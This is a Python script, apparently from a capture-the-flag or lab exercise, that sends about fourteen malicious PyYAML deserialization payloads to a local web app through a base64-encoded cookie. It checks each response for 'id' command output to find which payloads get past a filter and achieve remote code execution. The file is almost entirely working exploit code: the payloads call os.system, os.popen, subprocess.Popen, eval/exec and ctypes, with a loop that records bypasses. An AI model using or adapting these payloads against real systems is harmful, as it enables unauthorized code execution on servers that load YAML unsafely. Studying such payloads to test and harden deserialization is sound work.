import requests
import base64

target = "http://127.0.0.1:32979"

# Test various bypass payloads
malicious_payloads = [
    ("os.system !!python/object/apply", """- !!python/object/apply:os.system
  - "id"
"""),
    
    ("os.popen !!python/object/new", """- !!python/object/new:os.popen
  args:
    - "id"
"""),
    
    ("os._wrap_close new", """- !!python/object/new:os._wrap_close
  args:
    - "id"
    - r
"""),
    
    ("eval exec", """- !!python/object/apply:builtins.exec
  - "import os; os.system('id')"
"""),
    
    ("eval eval", """- !!python/object/apply:builtins.eval
  - "__import__('os').system('id')"
"""),

    ("subprocess.Popen", """- !!python/object/apply:subprocess.Popen
  - ["id"]
  - stdout: !!python/object/apply:subprocess.PIPE
"""),

    ("os.popen inline", """- !!python/object:new:os.popen ["id"]
"""),

    ("functools.partial os.system", """- !!python/object:new:functools.partial
  args:
    - !!python/name:os.system
    - "id"
"""),

    ("method read on popen", """- !!python/object/apply:builtins.getattr
  - !!python/object/new:os.popen ["id"]
  - "read"
"""),

    ("blockinfile trigger", """- !!python/object/new:ansible.plugins.action.blockinfile.ActionModule
  _task:
    args:
      block: "{{ lookup('pipe', 'id') }}"
"""),

    ("importlib import", """- !!python/object/apply:importlib.__import__
  - os
  - 1
"""),

    ("ctypes.call_catch_errors", """- !!python/object/apply:ctypes.pythonapi.PyRun_SimpleString
  - "import os; os.system('id')"
"""),

    ("warnings formatwarning", """- !!python/object/new:warnings.WarningMessage
  message: "{{ lookup('pipe', 'id') }}"
"""),

    ("popen.read via reduce", """- !!python/object/new:iter
  - !!python/object/new:tuple
    - !!python/object/new:os.popen ["id"]
    - !!python/object/apply:getattr [!!python/object/new:os.popen ["id"], "read"]
    - !!python/object/apply:getattr [!!python/object/new:os.popen ["id"], "close"]
"""),
]

session = requests.Session()
user_cookie = "f99d00962aa7465fa151128d2318d75d"
session.cookies.set("user", user_cookie, domain="127.0.0.1", path="/")

print("Testing malicious PyYAML payloads...")
print("="*70)

results = {"blocked": 0, "bypassed": 0, "error": 0}

for name, yaml_data in malicious_payloads:
    try:
        encoded = base64.b64encode(yaml_data.encode()).decode()
        session.cookies.set("bookmarks", encoded, domain="127.0.0.1", path="/")
        
        resp = session.get(target, timeout=10)
        status = resp.status_code
        
        # Check for command output in response
        has_cmd_output = "uid=" in resp.text or "root" in resp.text or "gid=" in resp.text
        
        if status == 500:
            results["blocked"] += 1
            print(f"\n[BLOCKED] {name}")
            print(f"  Status: {status}")
        elif status == 200:
            if has_cmd_output:
                results["bypassed"] += 1
                print(f"\n[BY PASSED + RCE!] {name}")
                print(f"  Status: {status}")
                # Extract command output
                import re
                match = re.search(r'(uid=[\d\(\)\s\w]+)', resp.text)
                if match:
                    print(f"  OUTPUT: {match.group()}")
                print(f"\n  Payload:\n{yaml_data[:200]}...")
                print(f"  Full Response:\n{resp.text}")
            else:
                results["bypassed"] += 1
                print(f"\n[BY PASSED (200)] {name}")
                print(f"  Status: {status}")
                # Check if response shows the payload or error
                if "app.models" in resp.text or "os" in resp.text.lower():
                    print(f"  Response contains suspicious content")
                    print(f"  Response (first 800 chars):\n{resp.text[:800]}")
    except Exception as e:
        results["error"] += 1
        print(f"\n[ERROR] {name}: {str(e)}")

print("\n" + "="*70)
print(f"SUMMARY: Blocked: {results['blocked']}, Bypassed: {results['bypassed']}, Errors: {results['error']}")

